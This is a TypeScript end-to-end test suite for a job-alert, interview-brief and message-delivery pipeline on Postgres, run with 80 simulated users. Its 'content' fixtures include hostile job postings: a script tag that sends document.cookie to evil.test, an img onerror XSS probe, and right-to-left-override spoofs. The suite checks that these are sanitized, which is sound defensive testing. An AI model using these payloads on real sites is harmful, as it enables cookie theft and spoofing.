// Proactive briefs, job alerts, interview briefs and delivery end to end on Postgres, round 2 (2026-10-30): 80 people
// through career-proactive's real handler (handleProactive, wired as index.ts wires it, the mail rail with a fake Gmail
// reader) and trainee-deliver's real handler (supabaseChannelStore, a fake LoopMessage and a fake WhatsApp at the HTTP
// boundary), on Postgres 16 with every migration (tests/flow/pg.ts) and the PostgREST double at the Supabase hop. No
// model, no network, a fixed clock. Runs are forced to overlap: three alerts runs at once, each having read the boards at
// another moment, and two delivery runs at once that both reach the template step before either sends.
// Eight groups of ten people:
//   overlap   three runs at once on different new postings: never more than the person's cap, each posting once, a full day
//   midrun    turn alerts off, or ask for fewer, while the runs go: nothing more, or no more than the new cap
//   content   postings with markup, direction overrides and the same job on two boards: visible words only, one alert a job
//   closed    postings closed between the plan and the delivery: the alert is not sent; the report says which closed
//   wa_late   web-only for days, then WhatsApp: no stale alerts or reports, the receipt still goes
//   wa_held   WhatsApp, silent for days: everything held, the template budget (WHATSAPP_DAILY_TEMPLATES) holds across two
//             delivery runs at once; those who write get every held row, whole
//   interview invites read from mail: the time on the person's own clock with the zone named, a reschedule said, a
//             cancellation said and marked, meeting passwords never echoed
//   prefs     after queueing: a higher fit floor, "fewer alerts", a new zone where it is night, a pause
// Run: deno test -A --no-check --import-map=tests/flow/supabase-npm.json tests/architect/flow-scenarios-proactive-r2.test.ts
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.117.1";
import assertNode from "node:assert/strict";
import { CI, haveDb, railDb, rows } from "../flow/send-rail-fixture.ts";
import { postgrestDouble } from "../flow/postgrest.ts";
import { supabaseParity } from "../flow/handler.ts";
import { handleProactive } from "../../supabase/functions/career-proactive/handler.ts";
import { handleDeliver } from "../../supabase/functions/trainee-deliver/handler.ts";
import { supabaseAlertStore } from "../../supabase/functions/_shared/career_alert_store.ts";
import { supabasePostingsDb } from "../../supabase/functions/_shared/career_ingest.ts";
import { supabaseChannelStore } from "../../supabase/functions/_shared/channel_store.ts";
import { supabaseDigestStore, supabaseInterviewStore } from "../../supabase/functions/_shared/career_brief_store.ts";
import { supabaseMailStore } from "../../supabase/functions/_shared/career_mail_store.ts";
import { WHATSAPP_WINDOW_MS } from "../../supabase/functions/_shared/channel_adapters.ts";

const eq = (a: unknown, b: unknown, m?: string) => assertNode.deepStrictEqual(a, b, m);
const ok = (v: unknown, m: string) => assertNode.ok(v, m);
// Tuesday 3 November 2026, 15:00 UTC: 10:00 in New York.
const T0 = Date.parse("2026-11-03T15:00:00Z"), MIN = 60000, HOUR = 3600000, DAY = 86400000;
const P_SECRET = "p".repeat(40), D_SECRET = "d".repeat(40);
const uid = (n: number) => `00000000-0000-4000-8000-0000000e${String(n).padStart(4, "0")}`;
const phone = (n: number) => `+1555027${String(n).padStart(4, "0")}`;
const wa = (n: number) => `wa:1555028${String(n).padStart(4, "0")}`;
const q = (s: string) => `'${s.replace(/'/g, "''")}'`;
const iso = (t: number) => new Date(t).toISOString();
const hex = (s: string) => Array.from(new TextEncoder().encode(s)).map((b) => b.toString(16).padStart(2, "0")).join("").padEnd(64, "0").slice(0, 64);
const AUTH = (d: string) => [`mx.google.com; dkim=pass header.i=@${d} header.s=s1; spf=pass smtp.mailfrom=${d}; dmarc=pass (p=REJECT) header.from=${d}`];
const ZONES = ["America/New_York", "America/Los_Angeles", "Europe/London", "Asia/Kolkata", "America/Chicago", "Europe/Berlin", "America/Denver", "UTC"];
const clockOf = (at: number, tz: string) => {
  const p = new Intl.DateTimeFormat("en-US", { timeZone: tz, year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", hourCycle: "h23" }).formatToParts(new Date(at));
  const g = (t: string) => p.find((x) => x.type === t)?.value ?? "";
  return { date: `${g("year")}-${g("month")}-${g("day")}`, hour: Number(g("hour")) % 24, minute: Number(g("minute")) };
};
const localTime = (at: number, tz: string) => { const c = clockOf(at, tz); return `${c.hour % 12 || 12}:${String(c.minute).padStart(2, "0")} ${c.hour < 12 ? "AM" : "PM"}`; };
const INVISIBLE = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f​-‏‪-‮⁠-⁤⁦-⁩﻿]/;

type Group = "overlap" | "midrun" | "content" | "closed" | "wa_late" | "wa_held" | "interview" | "prefs";
const GROUPS: Group[] = ["overlap", "midrun", "content", "closed", "wa_late", "wa_held", "interview", "prefs"];
const KEYWORD: Record<Group, string> = { overlap: "data analyst", midrun: "data analyst", content: "ux designer", closed: "account executive", wa_late: "zzzz nothing", wa_held: "zzzz nothing", interview: "zzzz nothing", prefs: "zzzz nothing" };
interface Person { n: number; id: string; group: Group; k: number; tz: string; cap: number }
const PEOPLE: Person[] = GROUPS.flatMap((g, gi) => Array.from({ length: 10 }, (_, k) => {
  const n = gi * 10 + k + 1;
  return { n, id: uid(n), group: g, k, tz: ZONES[k % ZONES.length], cap: g === "overlap" || g === "midrun" ? (k % 3) + 1 : 5 };
}));
const of = (g: Group) => PEOPLE.filter((p) => p.group === g);

Deno.test({ name: "proactive round 2 end to end on Postgres: 80 people, runs at once on different postings, WhatsApp, adversarial postings, interviews, changes before delivery", sanitizeResources: false, sanitizeOps: false, async fn(t) {
  if (!haveDb()) { if (CI) throw new Error("needs Postgres 16 in CI"); console.log("NOT_RUN locally: no Postgres binaries"); return; }
  const started = Date.now();
  const db = await railDb();
  try {
    await supabaseParity(db.pg as any);
    const double = postgrestDouble(db.pg as any, { url: "http://supabase.test", serviceKey: "service-test-key", users: {} });
    const admin: any = createClient("http://supabase.test", "service-test-key", { global: { fetch: double.fetch as typeof fetch }, auth: { persistSession: false, autoRefreshToken: false } });

    // ---------------------------------------------------------------------------------------- the people
    const sqls: string[] = [];
    for (const p of PEOPLE) {
      const l = clockOf(T0, p.tz);
      // Quiet hours that hold none of the test's hours on the person's clock (they start 13 hours after T0's hour).
      const qs = (l.hour + 13) % 24, qe = (l.hour + 17) % 24;
      const report = p.group === "closed";
      const prefs = { on: true, keywords: [KEYWORD[p.group]], locations: [], remote_ok: true, report_hour: report ? 0 : 8, quiet_start: qs, quiet_end: qe, max_instant_per_day: p.cap };
      sqls.push(`insert into auth.users(id, email) values (${q(p.id)}, ${q(`r2-${p.n}@example.test`)});
        insert into public.profiles(id) values (${q(p.id)});
        insert into public.career_alert_prefs(user_id, tz, prefs, last_checked_at, instant_sent_today, sent_on, last_report_on, held)
          values (${q(p.id)}, ${q(p.tz)}, ${q(JSON.stringify(prefs))}::jsonb, ${q(iso(T0 - 2 * HOUR))}, 0, null, ${report ? "null" : q(l.date)}, '{}');
        ${p.group === "wa_late" ? "" : p.group === "wa_held"
          ? `insert into public.channel_contacts(contact, user_id, last_inbound_at) values (${q(wa(p.n))}, ${q(p.id)}, ${q(iso(T0 - 3 * DAY))});`
          : `insert into public.channel_contacts(contact, user_id) values (${q(phone(p.n))}, ${q(p.id)});`}
        ${p.group === "interview" ? `insert into public.user_oauth_connections(user_id, provider, vault_name, scopes) values (${q(p.id)}, 'google_career', ${q(`oauth_google_career_${p.id}`)}, 'openid email');
          insert into public.career_apply_jobs(user_id, job_id, company, url, payload, payload_hash, approval_hash, state, updated_at)
            values (${q(p.id)}, ${q(`greenhouse:iv:${p.n}`)}, 'Acme', ${q(`https://boards.greenhouse.io/acme/jobs/${p.n}`)}, '{"title": "Data Analyst"}'::jsonb, ${q("a".repeat(64))}, ${q("a".repeat(64))}, 'submitted_unconfirmed', ${q(iso(T0 - 10 * DAY))});` : ""}`);
    }
    await db.sql.query(sqls.join("\n"));

    // ---------------------------------------------------------------------------------------- the boards
    type Post = { id: string; title: string; company: string; location: string; url: string; seen: number; closed: boolean; group: Group };
    const posts: Post[] = [];
    const addPost = async (p: Omit<Post, "closed"> & { closed?: boolean; pay?: string }) => {
      posts.push({ closed: false, ...p });
      await db.sql.query(`insert into public.career_postings(job_id, provider, board, company, title, location, url, description, posted_at, first_seen_at, last_seen_at, pay)
        values (${q(p.id)}, ${q(p.id.split(":")[0])}, ${q(p.id.split(":")[1])}, ${q(p.company)}, ${q(p.title)}, ${q(p.location)}, ${q(p.url)}, 'The role.', ${q(iso(p.seen - HOUR))}, ${q(iso(p.seen))}, ${q(iso(p.seen))}, ${p.pay ? q(p.pay) : "null"})`);
    };
    // overlap and midrun: 6 data analyst postings before the runs; each run reads 3 more that the run before it did not see
    for (let i = 1; i <= 6; i++) await addPost({ id: `greenhouse:r2o:${i}`, title: i % 2 ? "Data Analyst" : "Senior Data Analyst", company: `Firm O${i}`, location: "Remote", url: `https://boards.greenhouse.io/r2o/jobs/${i}`, seen: T0 - (60 - i) * MIN, group: "overlap" });
    const lateSeen = (run: number, i: number) => T0 + run * 20000 + i * 1000;
    for (let run = 1; run <= 2; run++) for (let i = 1; i <= 3; i++) await addPost({ id: `greenhouse:r2o:late${run}-${i}`, title: "Data Analyst II", company: `Late R${run}-${i}`, location: "New York, NY", url: `https://boards.greenhouse.io/r2o/jobs/late${run}${i}`, seen: lateSeen(run, i), group: "overlap" });
    // content: markup, direction overrides, emoji; and the same job on two boards (other pay)
    const nasty = [
      { title: "<b>UX Designer</b> <a href=\"https://evil.test/x\">apply</a>", company: "<i>Northwind</i>" },
      { title: "UX Designer ‮gnp.exe‬", company: "Contoso⁦ ‮moc.live⁩" },
      { title: "Senior UX Designer<script>fetch('https://evil.test/'+document.cookie)</script>", company: "Fabrikam<img src=x onerror=alert(1)>" },
      { title: "🚀 Lead UX Designer 💰", company: "Tailspin 🦄" },
    ];
    for (const [i, x] of nasty.entries()) await addPost({ id: `greenhouse:r2c:${i}`, ...x, location: "Remote", url: `https://boards.greenhouse.io/r2c/jobs/${i}`, seen: T0 - (40 - i) * MIN, group: "content", pay: "$9,999,999/hr" });
    await addPost({ id: "greenhouse:r2c:twin", title: "Principal UX Designer", company: "Woodgrove", location: "Austin, TX", url: "https://boards.greenhouse.io/r2c/jobs/twin", seen: T0 - 30 * MIN, group: "content", pay: "$150,000" });
    await addPost({ id: "lever:r2c:twin", title: "Principal UX Designer", company: "Woodgrove", location: "Austin, TX", url: "https://jobs.lever.co/r2c/twin", seen: T0 - 29 * MIN, group: "content", pay: "$95,000" });
    // closed: three account executive postings; two close after the run queues them
    for (let i = 1; i <= 3; i++) await addPost({ id: `greenhouse:r2x:${i}`, title: "Account Executive", company: `Closer ${i}`, location: "Chicago, IL", url: `https://boards.greenhouse.io/r2x/jobs/${i}`, seen: T0 - (50 - i) * MIN, group: "closed" });

    // ---------------------------------------------------------------------------------------- the handlers
    const postingsDb = supabasePostingsDb(admin);
    const mails = new Map<string, { hash: string; from: string; subject: string; snippet: string; date: string; auth: string[] }[]>();
    const proactive = async (at: number, o: { boards?: (rows: any[]) => any[]; gate?: Promise<void>; onRead?: () => void } = {}) => {
      const env: Record<string, string> = { CAREER_PROACTIVE_SECRET: P_SECRET, CAREER_BRIEF_DIGEST: "on", CAREER_MAIL_TRACKING: "on" };
      const res = await handleProactive(new Request("http://local/career-proactive", { method: "POST", headers: { "x-trainee-proactive-secret": P_SECRET } }), {
        env: { get: (k: string) => env[k] }, now: () => at, store: () => supabaseAlertStore(admin),
        recentPostings: async (since) => { o.onRead?.(); if (o.gate) await o.gate; const r = await postingsDb.newSince(since); return o.boards ? o.boards(r) : r; },
        postingsById: (ids) => postingsDb.getMany(ids),
        mail: { store: () => supabaseMailStore(admin), read: async (u, since) => { const m = (mails.get(u) ?? []).filter((x) => Date.parse(x.date) >= since); return { status: "ok", mails: m, readThrough: at, listed: m.length }; } },
        briefs: { interviews: () => supabaseInterviewStore(admin), drafts: () => supabaseMailStore(admin), digest: () => supabaseDigestStore(admin) },
        quiet: async (ids) => {
          const { data, error } = await admin.rpc("career_quiet_users", { p_users: ids });
          if (error) throw new Error(`read who is paused: ${error.message}`);
          return new Set<string>((data ?? []).map((r: any) => String(r?.user_id ?? r)));
        },
        watches: async () => new Map(),
        recordRun: async () => {},
      });
      return { status: res.status, body: await res.json() };
    };
    const sent: { channel: string; to: string; text: string }[] = [], templates: string[] = [];
    const deliverOnce = async (at: number, o: { store?: (s: any) => any; templateCap?: number } = {}) => {
      const env: Record<string, string> = { TRAINEE_DELIVER_SECRET: D_SECRET, LOOPMESSAGE_API_KEY: "fake-loop-key" };
      const res = await handleDeliver(new Request("http://local/trainee-deliver", { method: "POST", headers: { "x-trainee-deliver-secret": D_SECRET } }), {
        env: { get: (k: string) => env[k] }, now: () => at,
        store: () => (o.store ? o.store(supabaseChannelStore(admin)) : supabaseChannelStore(admin)),
        send: () => async (contact, bubbles) => { sent.push({ channel: "imessage", to: contact, text: bubbles.join("\n") }); return { ok: true, id: `loop-${sent.length}` }; },
        adapters: () => ({ whatsapp: { channel: "whatsapp", limits: { windowMs: WHATSAPP_WINDOW_MS, dailyTemplates: o.templateCap ?? 250 }, render: (t: string) => [t],
          send: async (address: string, bubbles: string[]) => { sent.push({ channel: "whatsapp", to: address, text: bubbles.join("\n") }); return { ok: true, id: `wamid.${sent.length}` }; },
          sendTemplate: async (address: string) => { await new Promise((r) => setTimeout(r, 0)); templates.push(address); return { ok: true, id: `wamid.t${templates.length}` }; } } }),
        recordRun: async () => {},
      });
      const body = await res.json();
      eq(res.status, 200, `trainee-deliver: ${JSON.stringify(body)}`);
      return body;
    };
    const deliver = async (at: number) => { for (let i = 0; i < 15; i++) { const b = await deliverOnce(at); if (!b.delivered && !b.skipped_opt_out && !b.held && !b.deferred) return; } };
    const outbox = async (p: Person) => await rows<{ id: number; key: string; kind: string; status: string; text: string; deliver_at: string; error: string | null }>(db,
      `select id, key, kind, status, text, deliver_at, error from public.career_outbox where user_id = ${q(p.id)} order by id`);

    await t.step("three alerts runs at once, each having read the boards at another moment; some people change their alerts while they go", async () => {
      // Each run reads the boards with what had arrived by then (the third sees six more than the first); all three have
      // read the people before any plans; the changes land then.
      let reads = 0;
      let release!: () => void;
      const gate = new Promise<void>((r) => { release = r; });
      const onRead = () => { if (++reads === 3) setTimeout(async () => {
        const mid = of("midrun");
        await db.sql.query(mid.filter((p) => p.k < 5).map((p) => `update public.career_alert_prefs set prefs = jsonb_set(prefs, '{on}', 'false') where user_id = ${q(p.id)};`).join("\n"));
        await db.sql.query(mid.filter((p) => p.k >= 5).map((p) => `update public.career_alert_prefs set prefs = jsonb_set(prefs, '{max_instant_per_day}', '1') where user_id = ${q(p.id)};`).join("\n"));
        release();
      }, 0); };
      const upTo = (run: number) => (r: any[]) => r.filter((x) => !String(x.job_id).includes(":late") || Number(String(x.job_id).split(":late")[1][0]) <= run);
      const at = T0 + 3 * MIN;
      const runs = await Promise.all([0, 1, 2].map((run) => proactive(at + run * 1000, { boards: upTo(run), gate, onRead })));
      for (const r of runs) eq([r.status, r.body.errors ?? null], [200, null], `each run is clean: ${JSON.stringify(r.body).slice(0, 300)}`);
    });

    await t.step("overlap: never more than the cap, each posting once, a full day; midrun: off means nothing, fewer means at most the new cap", async () => {
      const all = await rows<{ user_id: string; key: string; text: string }>(db, `select user_id, key, text from public.career_outbox where kind = 'alert'`);
      for (const p of of("overlap")) {
        const mine = all.filter((a) => a.user_id === p.id);
        eq(new Set(mine.map((a) => a.key)).size, mine.length, `overlap ${p.n}: each posting once`);
        eq(mine.length, p.cap, `overlap ${p.n}: exactly the cap of ${p.cap} across three runs at once (got ${mine.map((a) => a.key).join(", ")})`);
        const row = (await rows<{ n: number }>(db, `select instant_sent_today as n from public.career_alert_prefs where user_id = ${q(p.id)}`))[0];
        eq(Number(row.n), p.cap, `overlap ${p.n}: the day's count is the alerts queued`);
      }
      for (const p of of("midrun")) {
        const mine = all.filter((a) => a.user_id === p.id);
        if (p.k < 5) eq(mine.length, 0, `midrun ${p.n}: alerts turned off while the runs went; nothing queued after`);
        else ok(mine.length <= 1, `midrun ${p.n}: asked for 1 a day while the runs went; ${mine.length} queued`);
      }
    });

    await t.step("content: only visible words, no pay, one alert for the same job on two boards", async () => {
      for (const p of of("content")) {
        const mine = (await outbox(p)).filter((o) => o.kind === "alert");
        eq(mine.length, 5, `content ${p.n}: four postings and one job on two boards: ${mine.map((o) => o.key).join(", ")}`);
        ok(mine.filter((o) => /:twin$/.test(o.key)).length === 1, `content ${p.n}: the twin job once`);
        for (const o of mine) {
          ok(!INVISIBLE.test(o.text), `content ${p.n}: no invisible characters: ${JSON.stringify(o.text)}`);
          ok(!/<\s*\/?\s*[a-z][^>]*>/i.test(o.text), `content ${p.n}: no markup: ${o.text}`);
          ok(!/\$/.test(o.text), `content ${p.n}: no pay: ${o.text}`);
          ok(/^New match: .+ at .+\n https?:\/\//.test(o.text.replace("\n", "\n ")), `content ${p.n}: one line and its link: ${o.text}`);
        }
      }
    });

    await t.step("delivery after two postings closed: their alerts are not sent; the report says which closed", async () => {
      await db.sql.query(`update public.career_postings set closed_at = ${q(iso(T0 + 4 * MIN))} where job_id in ('greenhouse:r2x:1', 'greenhouse:r2x:2')`);
      await deliver(T0 + 10 * MIN);
      for (const p of of("closed")) {
        const o = await outbox(p);
        const alerts = o.filter((x) => x.kind === "alert");
        eq(alerts.length, 3, `closed ${p.n}: three alerts were queued`);
        for (const a of alerts) eq(a.status, /:r2x:3$/.test(a.key) ? "delivered" : "skipped_opt_out", `closed ${p.n}: ${a.key}`);
        const report = sent.find((s) => s.to === phone(p.n) && s.text.startsWith("Your daily job report"));
        ok(report, `closed ${p.n}: the report went`);
        for (const i of [1, 2]) ok(new RegExp(`Closer ${i} \\(Chicago, IL\\) \\(this posting has closed`).test(report!.text), `closed ${p.n}: the report says Closer ${i} closed: ${report!.text}`);
        ok(!/Closer 3 \(Chicago, IL\) \(this posting has closed/.test(report!.text), `closed ${p.n}: the open one is not said closed`);
      }
      for (const p of of("content")) ok(sent.filter((s) => s.to === phone(p.n)).every((s) => !INVISIBLE.test(s.text) && !/<\s*\/?\s*[a-z][^>]*>/i.test(s.text)), `content ${p.n}: what went out is clean`);
    });

    await t.step("WhatsApp connected three days late: no stale alert or report, the receipt still goes", async () => {
      const at = T0 + 30 * MIN;
      for (const p of of("wa_late")) {
        await db.sql.query(`insert into public.career_outbox(user_id, key, kind, text, deliver_at) values
          (${q(p.id)}, ${q(`alert:greenhouse:old:${p.n}`)}, 'alert', 'New match: Data Analyst at Old Firm (Remote), first seen 20 min ago.\nhttps://boards.greenhouse.io/old/jobs/1', ${q(iso(at - 3 * DAY))}),
          (${q(p.id)}, ${q(`report:2026-10-31`)}, 'report', 'Your daily job report: no new matches in the last day. I''m still watching.', ${q(iso(at - 3 * DAY + HOUR))}),
          (${q(p.id)}, ${q(`receipt:late-${p.n}`)}, 'receipt', 'Applied to Northwind: submitted.', ${q(iso(at - 10 * MIN))});
          insert into public.channel_contacts(contact, user_id, last_inbound_at) values (${q(wa(p.n))}, ${q(p.id)}, ${q(iso(at - 2 * MIN))});`);
      }
      await deliver(at);
      for (const p of of("wa_late")) {
        const o = await outbox(p);
        for (const x of o) eq([x.key, x.status], [x.key, x.kind === "receipt" ? "delivered" : "skipped_opt_out"], `wa_late ${p.n}: ${x.key} (${x.error})`);
        ok(!sent.some((s) => s.to === wa(p.n).slice(3) && /^(New match|Your daily job report)/.test(s.text)), `wa_late ${p.n}: nothing stale sent`);
      }
    });

    await t.step("WhatsApp silent for days: held; two delivery runs at once keep the template budget; writing brings every held row, whole", async () => {
      const at = T0 + 40 * MIN, cap = 4;
      for (const p of of("wa_held")) {
        await db.sql.query([0, 1, 2].map((j) => `insert into public.career_outbox(user_id, key, kind, text, deliver_at) values (${q(p.id)}, ${q(`receipt:held-${p.n}-${j}`)}, 'receipt', ${q(`Applied to Firm ${p.n}-${j}: submitted.`)}, ${q(iso(at - (5 - j) * MIN))});`).join("\n"));
      }
      // Both runs reach the template step before either sends one.
      let entered = 0, done = 0;
      const waiters: (() => void)[] = [];
      const check = () => { if (entered + done >= 2) while (waiters.length) waiters.shift()!(); };
      const runs = new Set<number>();
      const barrier = async (run: number) => { if (!runs.has(run)) { runs.add(run); entered++; check(); } if (entered + done < 2) await new Promise<void>((r) => waiters.push(r)); };
      const wrap = (run: number) => (s: any) => ({ ...s,
        nudgesOn: async (d: string) => { await barrier(run); return s.nudgesOn(d); },
        claimTemplate: async (c: string, d: string, n: number, t: number) => { await barrier(run); return s.claimTemplate(c, d, n, t); } });
      const before = templates.length;
      await Promise.all([0, 1].map(async (run) => { try { await deliverOnce(at, { store: wrap(run), templateCap: cap }); } finally { done++; check(); } }));
      const mine = new Set(of("wa_held").map((p) => wa(p.n).slice(3)));
      const sentTemplates = templates.slice(before).filter((x) => mine.has(x));
      ok(sentTemplates.length <= cap, `${sentTemplates.length} waiting-updates templates on a budget of ${cap} with two delivery runs at once`);
      eq(new Set(sentTemplates).size, sentTemplates.length, "one template a person");
      for (const p of of("wa_held")) ok((await outbox(p)).every((x) => x.status === "held"), `wa_held ${p.n}: every row held`);
      // Three write: their held rows go back in the queue and go out whole.
      for (const p of of("wa_held").slice(0, 3)) await admin.rpc("channel_inbound_seen", { p_contact: wa(p.n), p_at: iso(at + 5 * MIN), p_alias: null, p_phone: null });
      await deliver(at + 6 * MIN);
      for (const p of of("wa_held")) {
        const o = await outbox(p);
        if (p.k < 3) {
          eq(o.map((x) => x.status), ["delivered", "delivered", "delivered"], `wa_held ${p.n}: every held row after they wrote`);
          for (const x of o) eq(sent.filter((s) => s.to === wa(p.n).slice(3) && s.text === x.text).length, 1, `wa_held ${p.n}: ${x.key} once, whole`);
        } else ok(o.every((x) => x.status === "held"), `wa_held ${p.n}: still held, nothing lost`);
      }
    });

    await t.step("interviews read from mail: the person's own clock, a reschedule said, a cancellation said and marked, no password echoed", async () => {
      const at = T0 + 50 * MIN;
      const iv = of("interview");
      for (const p of iv) {
        const from = "Acme Recruiting <recruiting@acme.com>";
        const list = [{ hash: hex(`inv-${p.n}`), from, subject: "Interview invitation - Data Analyst", date: iso(at - 20 * MIN), auth: AUTH("acme.com"),
          snippet: `Hi Sam, we'd like to invite you to a video interview on Zoom for the Data Analyst role on Thursday, November 12, 2026 at 2:00 PM ET. Meeting ID: 845 1234 5678 Passcode: ${700000 + p.n}.` }];
        if (p.k % 3 === 1) list.push({ hash: hex(`mov-${p.n}`), from, subject: "Interview rescheduled - Data Analyst", date: iso(at - 10 * MIN), auth: AUTH("acme.com"),
          snippet: "Hi Sam, we need to move your interview for the Data Analyst role to Friday, November 13, 2026 at 11:00 AM PT. Same link as before." });
        if (p.k % 3 === 2) list.push({ hash: hex(`can-${p.n}`), from, subject: "Interview cancelled - Data Analyst", date: iso(at - 10 * MIN), auth: AUTH("acme.com"),
          snippet: "Hi Sam, unfortunately we have to cancel your interview for the Data Analyst role on Thursday, November 12, 2026. We will be in touch." });
        mails.set(p.id, list);
      }
      const r = await proactive(at);
      eq([r.status, r.body.errors ?? null], [200, null], JSON.stringify(r.body).slice(0, 400));
      for (const p of iv) {
        const o = await outbox(p);
        const all = o.map((x) => x.text).join("\n");
        ok(!all.includes(String(700000 + p.n)), `interview ${p.n}: the meeting passcode is never echoed`);
        const brief = o.find((x) => /^brief:[0-9a-f]{64}:1$/.test(x.key));
        ok(brief && o.some((x) => /^brief:[0-9a-f]{64}:2$/.test(x.key)), `interview ${p.n}: the brief, whole: ${o.map((x) => x.key).join(", ")}`);
        const start = Date.parse("2026-11-12T19:00:00Z");
        ok(brief!.text.includes(localTime(start, p.tz)) && brief!.text.includes(p.tz), `interview ${p.n}: 2:00 PM ET on the person's clock (${localTime(start, p.tz)}, ${p.tz}): ${brief!.text.split("\n")[1]}`);
        if (p.k % 3 === 1) {
          const moved = o.find((x) => x.key.endsWith(":moved"));
          ok(moved && moved.text.includes(localTime(Date.parse("2026-11-13T19:00:00Z"), p.tz)), `interview ${p.n}: the new time said on their clock: ${moved?.text}`);
        }
        const rowsIv = await rows<{ interview_date: string; moved_at: string | null; cancelled_at: string | null }>(db, `select interview_date::text, moved_at, cancelled_at from public.career_interviews where user_id = ${q(p.id)} order by seen_at, id`);
        if (p.k % 3 === 2) {
          ok(o.some((x) => x.kind === "status" && /cancelled your interview/.test(x.text)), `interview ${p.n}: the cancellation said: ${o.map((x) => x.text.slice(0, 60)).join(" | ")}`);
          ok(rowsIv.length && rowsIv.every((x) => x.cancelled_at), `interview ${p.n}: the interview marked cancelled: ${JSON.stringify(rowsIv)}`);
        }
        if (p.k % 3 === 1) ok(rowsIv.some((x) => x.interview_date === "2026-11-12" && x.moved_at) && rowsIv.some((x) => x.interview_date === "2026-11-13" && !x.moved_at), `interview ${p.n}: the old date marked moved: ${JSON.stringify(rowsIv)}`);
      }
      // After the interview: a thank-you only where it is still on, and only for its date.
      const after = Date.parse("2026-11-13T22:00:00Z");
      const r2 = await proactive(after);
      eq(r2.status, 200, JSON.stringify(r2.body).slice(0, 300));
      const after2 = Date.parse("2026-11-12T22:30:00Z");
      await proactive(after2);
      for (const p of iv) {
        const drafts = await rows<{ draft_key: string }>(db, `select draft_key from public.career_mail_drafts where user_id = ${q(p.id)} and kind = 'thank_you'`);
        if (p.k % 3 === 2) eq(drafts, [], `interview ${p.n}: no thank-you for a cancelled interview`);
        if (p.k % 3 === 1) ok(drafts.every((d) => !d.draft_key.endsWith("2026-11-12")), `interview ${p.n}: no thank-you for the date it moved from: ${JSON.stringify(drafts)}`);
        if (p.k % 3 === 0) ok(drafts.some((d) => d.draft_key.endsWith("2026-11-12")), `interview ${p.n}: the thank-you for the interview that happened: ${JSON.stringify(drafts)}`);
      }
    });

    await t.step("changes after queueing: a higher fit floor, fewer alerts, a new zone where it is night, a pause", async () => {
      const at = T0 + 70 * MIN;
      const pf = of("prefs");
      for (const p of pf) {
        await db.sql.query([0, 1, 2].map((j) => `insert into public.career_postings(job_id, provider, board, company, title, location, url, description, first_seen_at, last_seen_at)
            values (${q(`greenhouse:pf:${p.n}-${j}`)}, 'greenhouse', 'pf', ${q(`Firm ${p.n}`)}, 'Zzzz Nothing Analyst', 'Remote', ${q(`https://boards.greenhouse.io/pf/jobs/${p.n}${j}`)}, 'x', ${q(iso(at - HOUR))}, ${q(iso(at - HOUR))}) on conflict do nothing;
          insert into public.career_outbox(user_id, key, kind, text, deliver_at, alert_fit) values (${q(p.id)}, ${q(`alert:greenhouse:pf:${p.n}-${j}`)}, 'alert', ${q(`New match: ${p.n}-${j}`)}, ${q(iso(at - (3 - j) * MIN))}, ${[55, 72, 90][j]});`).join("\n"));
        const change = p.k < 3 ? `prefs = prefs || '{"min_fit": 80}'::jsonb` : p.k < 6 ? `prefs = jsonb_set(prefs, '{max_instant_per_day}', '1')` : p.k < 9 ? `tz = 'Asia/Tokyo', prefs = prefs || '{"quiet_start": 22, "quiet_end": 7}'::jsonb` : null;
        if (change) await db.sql.query(`update public.career_alert_prefs set ${change} where user_id = ${q(p.id)}`);
        else await db.sql.query(`insert into public.career_watch_kv(user_id, key, value) values (${q(p.id)}, 'career:account', '{"epoch": 0, "version": 0, "paused": true}')`);
      }
      await deliver(at);
      for (const p of pf) {
        const o = (await outbox(p)).filter((x) => x.kind === "alert");
        const st = o.map((x) => x.status);
        if (p.k < 3) eq(st, ["skipped_opt_out", "skipped_opt_out", "delivered"], `prefs ${p.n}: fit floor raised to 80: only the fit of 90 goes`);
        else if (p.k < 6) eq(st.filter((s) => s === "delivered").length, 1, `prefs ${p.n}: "fewer alerts" (1 a day): one goes: ${st}`);
        else if (p.k < 9) {
          ok(st.every((s) => s === "queued"), `prefs ${p.n}: moved to Tokyo, where it is past midnight: nothing goes now: ${st}`);
          ok(o.every((x) => clockOf(Date.parse(x.deliver_at), "Asia/Tokyo").hour === 7), `prefs ${p.n}: held for 7:00 in Tokyo: ${o.map((x) => x.deliver_at)}`);
        } else ok(st.every((s) => s === "skipped_opt_out"), `prefs ${p.n}: paused: nothing goes`);
      }
      eq(await rows(db, `select key from public.career_outbox where status = 'sending'`), [], "nothing stuck sending");
      console.log(`[proactive r2 flow] ${PEOPLE.length} people, ${sent.length} texts, ${templates.length} templates, ${Date.now() - started} ms`);
    });
  } finally {
    await db.stop();
  }
} });
